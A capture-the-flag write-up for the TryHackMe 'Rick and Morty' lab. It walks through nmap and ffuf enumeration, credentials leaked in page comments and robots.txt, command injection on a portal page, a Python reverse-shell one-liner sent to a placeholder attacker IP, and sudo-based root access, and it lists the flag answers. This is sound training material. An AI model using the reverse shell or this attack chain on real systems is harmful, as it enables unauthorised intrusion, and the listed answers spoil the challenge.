# Rick and Morty — TryHackMe

- **OS:** Linux
- **IP:** 10.113.185.115
- **Status:** ✅ Pwned

## Enumeration

Starting with a port scan using [Nmap](../Tools/nmap.md):
```bash
nmap -sC -sV -A 10.113.185.115
```

Only ports 22 (SSH) and 80 (HTTP) are open.

Inspecting the DOM of the main page I find a comment revealing a username:
```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

Proceeding with directory enumeration using [Ffuf](../Tools/ffuf.md):
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.185.115/FUZZ -e .php,.txt,.html,.bak -fs 279 -t 100 2>/dev/null
```

Found: `login.php` and `robots.txt`.

Inside `robots.txt` I find the string `Wubbalubbadubdub`, which looks like a password.

Trying the credentials on `login.php`:
- **Username:** R1ckRul3s
- **Password:** Wubbalubbadubdub

Access granted.

## Exploit

After logging in I'm redirected to `portal.php`, which contains a command input field — a Remote Code Execution vulnerability.

Running `ls` I can see the following files:
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Trying `cat Sup3rS3cretPickl3Ingred.txt` returns "access denied", so I check if Python3 is available to spawn a reverse shell:
```bash
find / -name "python3" 2>/dev/null
```

Python3 is available. Setting up a [Reverse shell](../Tools/reverse-shell.md):
```bash
# on my machine
nc -lvnp 4444

# on the target via the command input
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Once inside I check the current user:
```bash
whoami
# www-data
```

As `www-data` I can now read the first ingredient:
```bash
cat Sup3rS3cretPickl3Ingred.txt
# mr. meeseek hair
```

Navigating to `/home/rick` I find the second ingredient:
```bash
cat '/home/rick/second ingredients'
# 1 jerry tear
```

## Privilege Escalation

Checking sudo permissions:
```bash
sudo -l
# (ALL) NOPASSWD: ALL
```

`www-data` can run any command as root without a password — a critical misconfiguration in `/etc/sudoers`.

Navigating to `/root`:
```bash
sudo ls /root
# 3rd.txt

sudo cat /root/3rd.txt
# 3rd ingredients: fleeb juice
```

## Flags

| Ingredient | Location | Value |
|---|---|---|
| 1st | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | mr. meeseek hair |
| 2nd | `/home/rick/second ingredients` | 1 jerry tear |
| 3rd | `/root/3rd.txt` | fleeb juice |

## Tools Used
- [Nmap](../Tools/Nmap.md)
- [Ffuf](../Tools/ffuf.md)
- [Netcat](../Tools/reverse-shell.md)

## Lessons Learned
- Always inspect the DOM source code for hidden comments
- `robots.txt` can contain sensitive information
- A misconfigured `/etc/sudoers` with `NOPASSWD: ALL` gives immediate root access